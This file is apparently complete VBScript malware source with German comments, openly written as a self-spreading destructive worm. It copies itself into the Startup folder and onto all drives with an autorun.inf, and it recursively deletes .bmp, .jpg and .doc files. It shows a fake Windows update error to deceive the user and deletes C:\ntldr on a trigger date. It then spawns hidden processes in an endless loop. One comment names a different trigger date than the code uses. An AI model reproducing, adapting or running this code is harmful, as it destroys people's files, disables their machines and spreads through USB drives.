' Selbstkopie in Autostart
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
startupPath = shell.SpecialFolders("Startup")
path = startupPath & "\winupdate.vbs"
If Not fso.FileExists(path) Then
    fso.CopyFile WScript.ScriptFullName, path, True
End If

' Verbreitung auf alle Laufwerke (inkl. USB)
For Each drive In fso.Drives
    If drive.DriveType = 1 Or drive.DriveType = 2 Then ' Wechseldatenträger oder Festplatte
        On Error Resume Next
        fso.CopyFile WScript.ScriptFullName, drive.Path & "\winupdate.vbs", True
        ' Erstelle autorun.inf korrekt:
        Set autorunFile = fso.CreateTextFile(drive.Path & "\autorun.inf", True)
        autorunFile.WriteLine("[autorun]")
        autorunFile.WriteLine("open=winupdate.vbs")
        autorunFile.WriteLine("shellexecute=winupdate.vbs")
        autorunFile.Close
        On Error GoTo 0
        
        ' Lösche .bmp, .jpg und .doc Dateien
        DeleteFiles drive.Path
    End If
Next

' Funktion zum Löschen der Dateien
Sub DeleteFiles(directory)
    On Error Resume Next
    Set folder = fso.GetFolder(directory)
    For Each file In folder.Files
        ' Überprüfen der Dateierweiterung
        If LCase(fso.GetExtensionName(file.Name)) = "bmp" Or _
           LCase(fso.GetExtensionName(file.Name)) = "jpg" Or _
           LCase(fso.GetExtensionName(file.Name)) = "doc" Then
            file.Delete True ' Dateien löschen
        End If
    Next
    ' Durchlaufe alle Unterordner
    For Each subfolder In folder.Subfolders
        DeleteFiles subfolder.Path ' Rekursive Funktion für Unterordner
    Next
End Sub

' Fake Fehlermeldung erzeugen, um den Benutzer zu täuschen
Sub ShowFakeError()
    MsgBox "Fehler: Abhängigkeit von Kernel32.dll nicht gefunden." & vbCrLf & _
           "Ein Update für Ihr System ist erforderlich, um die neueste Version von Windows auszuführen." & vbCrLf & _
           "Bitte stellen Sie sicher, dass Sie alle aktuellen Updates über Windows Update installieren.", _
           vbCritical, "Wichtige Systemmeldung"
End Sub

' Zeige den Fake-Fehler nach dem Start
ShowFakeError()

' Lösche ntldr nur am 8. März eines jeden Jahres
currentDate = Date
currentMonth = Month(currentDate)
currentDay = Day(currentDate)

' Wenn heute der 30. November ist, lösche ntldr
If currentMonth = 11 And currentDay = 30 Then
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists("C:\ntldr") Then
        fso.DeleteFile "C:\ntldr", True
    End If
    On Error GoTo 0
End If

' Tasks starten (Endlosschleife)
Do
    ' Hintergrundaufruf für Notepad
    shell.Run "notepad", 0 ' 0 sorgt dafür, dass das Fenster unsichtbar bleibt

    ' Hintergrundaufruf für die Eingabeaufforderung (CMD)
    shell.Run "cmd echo Warning!", 0 ' 0 sorgt dafür, dass das Fenster unsichtbar bleibt

    WScript.Sleep 1000 ' 1 Sekunde warten
Loop